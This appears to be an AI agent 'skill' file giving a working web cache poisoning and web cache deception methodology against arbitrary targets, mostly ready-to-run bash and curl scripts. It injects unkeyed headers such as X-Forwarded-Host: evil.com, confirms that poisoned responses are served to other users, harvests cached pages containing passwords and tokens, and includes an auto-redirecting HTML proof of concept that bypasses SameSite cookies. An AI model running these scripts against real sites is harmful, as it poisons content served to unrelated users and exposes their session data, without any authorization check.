---
name: cache-attack
description: Poison CDN cache or deceive when X-Cache header is detected.
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires agentiko worker (curl, nmap, python3, masscan, subfinder, httpx, nuclei)
metadata:
  hermes:
    tags: [recon, cache-poisoning, WCD, web-cache, CDN]
    category: recon
    related_skills:
      - wp-mass-recon
      - cors-credential-wordpress
      - staging-subdomain-hunt
---

# Cache Attack Skill

Web Cache Poisoning (WCP) and Web Cache Deception (WCD) methodology. WCP poisons cached pages with malicious content served to other users. WCD tricks the cache into storing sensitive pages that the attacker can then read. Both techniques exploit CDN and reverse-proxy caching behavior on CloudFront, Cloudflare, Fastly, Varnish, and Nginx.

## When to Use

- Target uses a CDN (CloudFront, Cloudflare, Fastly) or reverse proxy (Varnish, Nginx cache).
- Headers show `X-Cache`, `Age`, `cf-cache-status`, or `X-Cache-Hits`.
- After surface recon finds no direct vulnerabilities — pivot to infrastructure layer.
- Target allows file extension manipulation in URL paths (.css, .json, .js).

## Prerequisites

- `terminal` tool with curl.
- Cache buster parameter for safe testing (`?cb=RANDOM`).
- Patience: cache poisoning requires precise timing and may need multiple attempts.

## How to Run

```bash
# Phase 1: Detect cache
curl -skI "https://TARGET/" | grep -iE "age|x-cache|cf-cache-status|via|server"

# Phase 2: Test cache storage (two identical requests)
curl -skI "https://TARGET/?cb=TEST1" | grep -iE "x-cache|cf-cache-status"
curl -skI "https://TARGET/?cb=TEST1" | grep -iE "x-cache|cf-cache-status"
# Second response should show HIT if caching works

# Phase 3: Test unkeyed header reflection
curl -skI "https://TARGET/" -H "X-Forwarded-Host: evil.com" | grep -i "location\|evil.com"
```

## Quick Reference

### Web Cache Poisoning (WCP) — attacker poisons cache for victims

| Reflection Location | Impact | Severity |
|--------------------|--------|---------|
| `<link rel="canonical">` | SEO poisoning | Medium |
| `<script src="...">` | XSS (stored in cache) | Critical |
| `<meta property="og:url">` | Phishing (link preview) | High |
| `Location:` header | Mass open redirect | High |
| `<form action="...">` | Credential theft | High |
| `<link rel="stylesheet">` | CSS injection | Medium |

### Web Cache Deception (WCD) — victim's sensitive page cached, attacker reads it

| Technique | Example | Severity |
|-----------|---------|---------|
| Extension forcing | `/profile.php/.css` | Critical |
| Path delimiter | `/profile.php;.css` | Critical |
| Query string | `/profile?cb=123.css` | High |
| URL encoding | `/profile%2f..%2findex.css` | High |

## Procedure

### Phase 1 — Detect Cache

```bash
TARGET="$1"

echo "[*] Cache detection on $TARGET"

# Check for cache headers
RESP=$(curl -skI --max-time 10 "https://$TARGET/" 2>/dev/null)

echo "Cache headers:"
echo "$RESP" | grep -iE "age|x-cache|cf-cache-status|via|x-served-by|x-cache-hits|x-timer|server"

# Deduce CDN
if echo "$RESP" | grep -qi "cloudfront"; then
  echo "[+] CloudFront detected — test WCD with path delimiter tricks"
elif echo "$RESP" | grep -qi "cloudflare"; then
  echo "[+] Cloudflare detected — test WCP with unkeyed headers"
elif echo "$RESP" | grep -qi "varnish\|x-cache"; then
  echo "[+] Varnish detected — test WCD with extension forcing"
elif echo "$RESP" | grep -qi "akamai"; then
  echo "[+] Akamai detected — test WCP with X-Forwarded-Host"
fi

# Confirm caching with two identical requests
echo ""
echo "[*] Cache storage test:"
CACHE_BUSTER="cb=$(date +%s)"

echo -n "  Request 1: "
curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET/?$CACHE_BUSTER" -H "X-Cache-Debug: 1"
echo ""
sleep 2

echo -n "  Request 2: "
curl -sk -o /dev/null -w "X-Cache: %header{x-cache} | Age: %header{age}" "https://$TARGET/?$CACHE_BUSTER" 2>/dev/null
echo ""

# Test Age increment on repeated requests (no cache buster)
echo ""
echo -n "  Request 1 (no cb): "
AGE1=$(curl -skI "https://$TARGET/" 2>/dev/null | grep -i "^age:" | awk '{print $2}' | tr -d '\r')
echo "Age: ${AGE1:-none}"

sleep 3
echo -n "  Request 2 (no cb): "
AGE2=$(curl -skI "https://$TARGET/" 2>/dev/null | grep -i "^age:" | awk '{print $2}' | tr -d '\r')
echo "Age: ${AGE2:-none}"

if [[ -n "$AGE1" && -n "$AGE2" && "$AGE2" -gt "$AGE1" ]]; then
  echo "  [+] Age increments confirmed — cache is STORING responses"
fi
```

### Phase 2 — Find Unkeyed Inputs (WCP)

```bash
TARGET="$1"
CACHE_BUSTER="cb=$(date +%s)"

# 15 unkeyed headers to test
UNKEYED_HEADERS=(
  "X-Forwarded-Host: evil.com"
  "X-Forwarded-Scheme: http"
  "X-Forwarded-For: 127.0.0.1"
  "X-Host: evil.com"
  "X-Original-URL: /admin"
  "X-Rewrite-URL: /admin"
  "Forwarded: for=evil.com"
  "X-Forwarded-Port: 8443"
  "X-Amz-Website-Redirect-Location: /malicious"
  "X-HTTP-Method-Override: POST"
  "X-HTTP-Method: DELETE"
  "X-Method-Override: PUT"
)

echo "[*] Testing ${#UNKEYED_HEADERS[@]} unkeyed headers..."

for header in "${UNKEYED_HEADERS[@]}"; do
  key=$(echo "$header" | cut -d: -f1)
  value=$(echo "$header" | cut -d: -f2- | xargs)

  resp=$(curl -skI --max-time 10 "https://$TARGET/?$CACHE_BUSTER" -H "$header" 2>/dev/null)
  if echo "$resp" | grep -qi "$value"; then
    echo "  [REFLECTED] $key: $value"
    echo "    $(echo "$resp" | grep -i "location\|$value" | head -1)"
  fi
done
```

### Phase 3 — Prove Cache Storage (WCP)

```bash
TARGET="$1"
MALICIOUS="evil.com"
PAYLOAD="x-forwarded-host: $MALICIOUS"
CACHE_BUSTER="cb=POISON_TEST_$(date +%s)"

echo "[*] Cache poisoning test with $PAYLOAD"

# Step 1: Poison — send request with malicious header
echo "[1] Poisoning cache..."
POISON_RESP=$(curl -sk "https://$TARGET/?$CACHE_BUSTER" -H "$PAYLOAD" -o /dev/null -w "%{http_code}" 2>/dev/null)
echo "  Poison request: HTTP $POISON_RESP"

sleep 2

# Step 2: Confirm cache HIT
echo "[2] Checking cache..."
CACHE_HIT=$(curl -skI "https://$TARGET/?$CACHE_BUSTER" 2>/dev/null | grep -i "x-cache.*hit\|cf-cache-status.*HIT")
if [[ -n "$CACHE_HIT" ]]; then
  echo "  [+] Cache HIT confirmed: $CACHE_HIT"

  # Step 3: Read cached response (without the header)
  echo "[3] Reading cached response..."
  CACHED=$(curl -sk "https://$TARGET/?$CACHE_BUSTER" 2>/dev/null)
  if echo "$CACHED" | grep -q "$MALICIOUS"; then
    echo "  [CRITICAL] POISON STORED IN CACHE!"
    echo "  Malicious content served to all users of this URL"
  else
    echo "  [-] Poison not stored (header is keyed or response doesn't reflect)"
  fi
else
  echo "  [-] Cache MISS — response not cached"
fi
```

### Phase 4 — Web Cache Deception (WCD)

```bash
TARGET="$1"
SENSITIVE_URL="$2"  # e.g., /profile or /wp-json/wp/v2/users

echo "[*] WCD test on $TARGET"

# Test extension forcing
for ext in ".css" ".js" ".json" ".png" ".ico"; do
  WCD_URL="${SENSITIVE_URL}${ext}"
  echo "  Testing: $WCD_URL"

  # Step 1: Force cache with fake static extension
  curl -sk "https://$TARGET$WCD_URL" -H "X-Forwarded-Host: attacker.com" \
    -H "Accept: text/css,*/*" -o /tmp/wcd_test_$$.txt 2>/dev/null

  # Step 2: Check if sensitive data was cached
  CACHE_CHECK=$(curl -skI "https://$TARGET$WCD_URL" 2>/dev/null | grep -i "x-cache.*hit\|cf-cache-status.*HIT")
  if [[ -n "$CACHE_CHECK" ]]; then
    echo "  [CRITICAL] $WCD_URL CACHED — sensitive data stored!"

    # Check content
    if grep -qiE "email|password|token|user|auth" /tmp/wcd_test_$$.txt; then
      echo "  [CRITICAL] SENSITIVE DATA IN CACHED RESPONSE!"
      head -5 /tmp/wcd_test_$$.txt
    fi
  fi
  rm -f /tmp/wcd_test_$$.txt
done

# Test path delimiter tricks
for delim in ";.css" "%2f..%2findex.css" "..;.css"; do
  WCD_URL="${SENSITIVE_URL}${delim}"
  code=$(curl -sk -o /dev/null -w "%{http_code}" "https://$TARGET$WCD_URL" 2>/dev/null)
  [[ "$code" != "404" ]] && echo "  [POTENTIAL] $WCD_URL → HTTP $code"
done
```

### Phase 5 — SameSite Lax Bypass + WCD Combo

```bash
# If the target uses SameSite=Lax cookies, WCD alone won't work because
# cookies aren't sent on cross-site requests. But SameSite=Lax sends
# cookies on TOP-LEVEL NAVIGATION (meta refresh, anchor click, form GET).

# Combo payload:
cat > wcd_samesite_poc.html << 'HTMLEOF'
<html>
<head>
  <!-- Victim visits this page, auto-redirects to WCD URL with cookies -->
  <meta http-equiv="refresh" content="0; url=https://TARGET/profile.php/.css">
</head>
<body>
  <p>Redirecting...</p>
  <!-- Backup: anchor tag if meta refresh fails -->
  <a id="fallback" href="https://TARGET/profile.php/.css">Click here</a>
  <script>document.getElementById('fallback').click();</script>
</body>
</html>
HTMLEOF

echo "[+] WCD + SameSite bypass PoC saved to wcd_samesite_poc.html"
```

## Pitfalls

- **Reflection ≠ cache poisoning.** Just because a header is reflected doesn't mean it's CACHED. Always prove storage with a second request.
- **Cache buster is mandatory.** Never test without a unique cache buster per test, or you'll poison real user cache.
- **Cache Key Normalization.** CDNs may normalize URLs before caching. Test case variations, trailing slashes, and ignored parameters.
- **Fat GET smuggling.** Some CDNs accept 4000+ character query strings. The oversized request may be handled differently by origin vs cache.
- **Parameter Cloaking.** Duplicate parameters (e.g., `?p=1&p=2`) may cause cache key confusion.

## Verification

- WCP: Second request to the poisoned URL (without malicious header) MUST serve the poisoned content.
- WCD: Cached response MUST contain sensitive user data (PII, session tokens, API responses).
- Cache HIT MUST be confirmed via `X-Cache: Hit` or `cf-cache-status: HIT` header.
- Always restore clean state: flush your test cache entries after verification.
